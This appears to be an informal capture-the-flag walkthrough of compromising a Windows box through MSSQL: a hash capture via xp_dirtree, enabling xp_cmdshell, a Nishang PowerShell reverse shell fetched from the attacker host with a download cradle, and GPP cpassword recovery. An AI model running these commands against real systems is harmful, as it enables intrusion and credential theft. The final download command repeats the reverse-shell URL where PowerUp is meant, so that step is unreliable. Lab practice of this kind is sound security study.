nmap revealed smb

smb got an xml file containing macro with creds for mssql server running on port 1433

using [mssqlclient.py](http://mssqlclient.py)(from impacket) logged into mssql server. turned responder on and run the following command in the mssql server pointing to my box with responder:

```bash
exec xp_dirtree '\\10.10.10.10\share\file'
```

crack the hash with john and then go back into the mssql server with the new credentials

now able to run commands ( have to enable first with the following command):

```bash
enable_xp_cmdshell
```

now we need to prepare a rev shell fire it up and get a real shell on the box. using nishang powershellreverce tcp

with this payload at the bottom (that’s how it works ? )

```bash
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444
```

now that we sorted the powershell we fire up a python server, netcat listener and we get it over to the box using the mssql shell and the following command;

```bash
xp_cmdshell powershell iex(new-object net.webclient).downloadstring(\"http://10.10.10.10/Invoke-PowerShellTcp.ps1\")
```

and now we got real shell on the box. now we can load up powersploit powerup script. make sure you add at the end of it Invoke-AllChecks same as we done with the payload in the revshell then just bring it over to the box in the same way using the same payload without the \:

```bash
iex(new-object net.webclient).downloadstring("http://10.10.10.10/Invoke-PowerShellTcp.ps1")
```

that will reveal the cpassword storred in Groups.xml it may even decrypt it for us if not then we can just take the cpassword from within the file and use gpp-decrypt “cpassword” and will decrypt it for us
